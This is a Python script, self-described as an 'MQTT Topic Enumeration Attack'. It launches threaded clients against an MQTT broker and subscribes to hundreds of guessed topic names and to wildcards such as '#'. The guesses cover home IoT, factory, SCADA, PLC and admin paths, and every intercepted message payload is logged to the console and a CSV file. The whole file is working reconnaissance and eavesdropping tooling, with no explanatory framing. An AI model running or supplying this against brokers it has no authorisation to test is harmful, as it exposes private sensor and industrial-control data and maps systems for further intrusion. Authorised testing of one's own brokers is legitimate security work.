import argparse
import csv
import itertools
import os
import random
import threading
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

class TopicEnumerationAttack:
    def __init__(self, args):
        self.args = args
        self.stop_event = threading.Event()
        self.log_writer, self.log_handle = self._prep_log(args.log_csv)
        self.log_lock = threading.Lock()
        
        self.discovered_topics = set()
        self.subscription_attempts = 0
        self.successful_subscriptions = 0
        self.received_messages = 0
        
        self.topic_patterns = [
            "iot/devices/{device_id}/telemetry",
            "iot/sensors/{sensor_type}/{sensor_id}",
            "iot/actuators/{actuator_type}/{actuator_id}",
            "smart/{room}/{device_type}",
            "home/{location}/{sensor}",
            
            "factory/{line}/sensor/{id}",
            "industrial/{zone}/{machine}/status",
            "scada/{system}/{component}",
            "plc/{unit}/{signal}",
            
            "system/status",
            "system/health",
            "system/config", 
            "admin/users",
            "admin/logs",
            "debug/trace",
            "test/data",
            
            "iot/+/status",
            "system/+/config",
            "devices/+/data",
            "+/sensors/+",
            "#",  # All topics
            "iot/#",
            "system/#",
        ]
        
        self.device_names = [
            "temp", "humidity", "pressure", "light", "motion", "door", "window", 
            "fan", "heater", "camera", "lock", "alarm", "smoke", "co", "gas",
            "flow", "level", "ph", "conductivity", "turbidity", "chlorine"
        ]
        
        self.locations = [
            "living_room", "bedroom", "kitchen", "bathroom", "garage", "office",
            "warehouse", "factory_floor", "control_room", "server_room", "lab",
            "zone1", "zone2", "zone3", "area_a", "area_b", "building1", "building2"
        ]

    @staticmethod
    def _prep_log(path):
        if not path:
            return None, None
        exists = os.path.exists(path)
        handle = open(path, "a", newline="", encoding="utf-8")
        writer = csv.writer(handle)
        if not exists:
            writer.writerow([
                "timestamp_utc", "client_id", "topic", "action", "qos", 
                "status", "payload_preview", "details"
            ])
        return writer, handle

    def close(self):
        if self.log_handle:
            self.log_handle.flush()
            self.log_handle.close()

    def log_enumeration(self, client_id, topic, action, qos, status, payload_preview="", details=""):
        if not self.log_writer:
            return
        with self.log_lock:
            self.log_writer.writerow([
                datetime.now(timezone.utc).isoformat(),
                client_id, topic, action, qos, status, payload_preview, details
            ])

    def generate_topic_variants(self):
        topics = []
        
        for pattern in self.topic_patterns:
            if "{device_id}" in pattern:
                for i in range(1, 101):
                    topics.append(pattern.format(device_id=f"device_{i:03d}"))
                    
            elif "{sensor_type}" in pattern and "{sensor_id}" in pattern:
                for sensor_type in self.device_names[:10]:
                    for i in range(1, 21):
                        topics.append(pattern.format(sensor_type=sensor_type, sensor_id=f"sensor_{i:02d}"))
                        
            elif "{actuator_type}" in pattern and "{actuator_id}" in pattern:
                actuator_types = ["fan", "heater", "lock", "valve", "pump"]
                for actuator_type in actuator_types:
                    for i in range(1, 11):
                        topics.append(pattern.format(actuator_type=actuator_type, actuator_id=f"act_{i:02d}"))
                        
            elif "{room}" in pattern and "{device_type}" in pattern:
                for room in self.locations[:8]:
                    for device in self.device_names[:8]:
                        topics.append(pattern.format(room=room, device_type=device))
                        
            elif "{location}" in pattern and "{sensor}" in pattern:
                for location in self.locations[:10]:
                    for sensor in self.device_names[:10]:
                        topics.append(pattern.format(location=location, sensor=sensor))
                        
            elif any(var in pattern for var in ["{line}", "{zone}", "{machine}", "{system}", "{component}"]):
                for i in range(1, 6):
                    topic = pattern.format(line=f"line_{i}", zone=f"zone_{i}", 
                                         machine=f"machine_{i}", system=f"sys_{i}", 
                                         component=f"comp_{i}", unit=f"unit_{i}", 
                                         signal=f"signal_{i}", id=f"id_{i:02d}")
                    topics.append(topic)
            else:
                topics.append(pattern)
        
        for device in self.device_names[:15]:
            topics.extend([
                f"devices/{device}",
                f"sensors/{device}/data",
                f"actuators/{device}/command",
                f"{device}/status",
                f"{device}/config"
            ])
        
        return list(set(topics))

    def subscription_enumeration(self, client, client_id):
        topics_to_test = self.generate_topic_variants()
        print(f"[{client_id}] Testing {len(topics_to_test)} topic variants")
        
        def on_message(client, userdata, msg):
            topic = msg.topic
            payload_preview = str(msg.payload[:100])[2:-1] if len(msg.payload) > 100 else str(msg.payload)[2:-1]
            
            self.discovered_topics.add(topic)
            self.received_messages += 1
            
            self.log_enumeration(client_id, topic, "message_received", msg.qos, 
                                "success", payload_preview, f"payload_size={len(msg.payload)}")
            
            print(f"[{client_id}] Message from {topic}: {payload_preview[:50]}...")
        
        client.on_message = on_message
        
        batch_size = 50
        for i in range(0, len(topics_to_test), batch_size):
            if self.stop_event.is_set():
                break
                
            batch = topics_to_test[i:i+batch_size]
            
            for topic in batch:
                if self.stop_event.is_set():
                    break
                    
                try:
                    result, mid = client.subscribe(topic, qos=self.args.qos)
                    self.subscription_attempts += 1
                    
                    if result == mqtt.MQTT_ERR_SUCCESS:
                        status = "subscribed"
                        self.successful_subscriptions += 1
                    else:
                        status = "failed"
                        
                    self.log_enumeration(client_id, topic, "subscribe_attempt", 
                                       self.args.qos, status, "", f"result_code={result}")
                    
                    time.sleep(0.05)
                    
                except Exception as e:
                    self.log_enumeration(client_id, topic, "subscribe_attempt", 
                                       self.args.qos, "error", "", str(e))
            
            print(f"[{client_id}] Batch {i//batch_size + 1}/{(len(topics_to_test)-1)//batch_size + 1} complete. "
                  f"Discovered: {len(self.discovered_topics)} topics, "
                  f"Messages: {self.received_messages}")
            time.sleep(2)
        
        print(f"[{client_id}] Enumeration complete. Listening for messages...")
        while not self.stop_event.is_set():
            time.sleep(5)
            if self.received_messages > 0:
                print(f"[{client_id}] Total discovered topics: {len(self.discovered_topics)}, "
                      f"Messages received: {self.received_messages}")

    def wildcard_enumeration(self, client, client_id):
        wildcard_patterns = [
            "#",  # All topics
            "+/#",  # All subtopics of top level
            "iot/#",
            "system/#", 
            "devices/#",
            "sensors/#",
            "home/#",
            "factory/#",
            "+/+/#",  # Two level wildcards
            "iot/+/status",
            "iot/+/telemetry", 
            "system/+/config",
            "devices/+/data",
            "+/sensors/+",
            "+/actuators/+",
        ]
        
        def on_message(client, userdata, msg):
            topic = msg.topic
            payload_preview = str(msg.payload[:100])[2:-1] if len(msg.payload) > 100 else str(msg.payload)[2:-1]
            
            self.discovered_topics.add(topic)
            self.received_messages += 1
            
            self.log_enumeration(client_id, topic, "wildcard_message", msg.qos, 
                                "discovered", payload_preview, f"payload_size={len(msg.payload)}")
            
            if self.received_messages % 10 == 0:
                print(f"[{client_id}] Wildcard discovery: {len(self.discovered_topics)} unique topics")
        
        client.on_message = on_message
        
        for pattern in wildcard_patterns:
            if self.stop_event.is_set():
                break
                
            try:
                result, mid = client.subscribe(pattern, qos=self.args.qos)
                self.subscription_attempts += 1
                
                status = "subscribed" if result == mqtt.MQTT_ERR_SUCCESS else "failed"
                self.log_enumeration(client_id, pattern, "wildcard_subscribe", 
                                   self.args.qos, status, "", f"result_code={result}")
                
                print(f"[{client_id}] Wildcard subscription to: {pattern}")
                time.sleep(1)
                
            except Exception as e:
                self.log_enumeration(client_id, pattern, "wildcard_subscribe", 
                                   self.args.qos, "error", "", str(e))
        
        while not self.stop_event.is_set():
            time.sleep(10)
            print(f"[{client_id}] Wildcard enumeration - Discovered: {len(self.discovered_topics)} topics")

    def attack_worker(self, worker_id):
        client_id = f"{self.args.client_prefix}_{worker_id:03d}"
        client = mqtt.Client(client_id=client_id, clean_session=True, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        
        if self.args.username:
            client.username_pw_set(self.args.username, self.args.password)

        connected = False
        while not connected and not self.stop_event.is_set():
            try:
                client.connect(self.args.broker, self.args.port, self.args.keepalive)
                client.loop_start()
                connected = True
                print(f"[{client_id}] Connected to {self.args.broker}:{self.args.port}")
            except Exception as e:
                print(f"[{client_id}] Connection failed: {e}, retrying in 5s")
                time.sleep(5)

        if not connected:
            return

        try:
            if worker_id % 2 == 0:
                self.subscription_enumeration(client, client_id)
            else:
                self.wildcard_enumeration(client, client_id)
                
        except KeyboardInterrupt:
            pass
        finally:
            client.loop_stop()
            client.disconnect()
            print(f"[{client_id}] Disconnected")

    def run(self):
        print(f"Starting Topic Enumeration attack with {self.args.workers} workers")
        print(f"Target: {self.args.broker}:{self.args.port}")
        print(f"Strategies: subscription_enumeration, wildcard_enumeration")
        
        threads = []
        for i in range(self.args.workers):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(1)
        
        try:
            while True:
                time.sleep(15)
                print(f"\n=== Topic Enumeration Statistics ===")
                print(f"Subscription attempts: {self.subscription_attempts}")
                print(f"Successful subscriptions: {self.successful_subscriptions}")
                print(f"Unique topics discovered: {len(self.discovered_topics)}")
                print(f"Total messages received: {self.received_messages}")
                
                if len(self.discovered_topics) > 0:
                    print(f"Sample discovered topics: {list(self.discovered_topics)[:10]}")
                print("=====================================\n")
                
        except KeyboardInterrupt:
            print("\nStopping enumeration...")
            self.stop_event.set()
            
            for thread in threads:
                thread.join(timeout=10)
            
            print(f"\nEnumeration completed!")
            print(f"Total discovered topics: {len(self.discovered_topics)}")
            print(f"Messages received: {self.received_messages}")
            
            if self.discovered_topics:
                print(f"\nDiscovered topics:")
                for topic in sorted(self.discovered_topics):
                    print(f"  - {topic}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Topic Enumeration Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker address")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--username", help="MQTT username")
    parser.add_argument("--password", help="MQTT password")
    parser.add_argument("--keepalive", type=int, default=60, help="Keepalive interval")
    parser.add_argument("--qos", type=int, choices=[0, 1, 2], default=0, help="QoS level for subscriptions")
    
    parser.add_argument("--workers", type=int, default=2, help="Number of enumeration workers")
    
    parser.add_argument("--client-prefix", default="topic_enum", 
                       help="Client ID prefix")
    
    parser.add_argument("--log-csv", help="CSV file to log enumeration details")
    
    args = parser.parse_args()
    
    attack = TopicEnumerationAttack(args)
    try:
        attack.run()
    finally:
        attack.close()

if __name__ == "__main__":
    main()
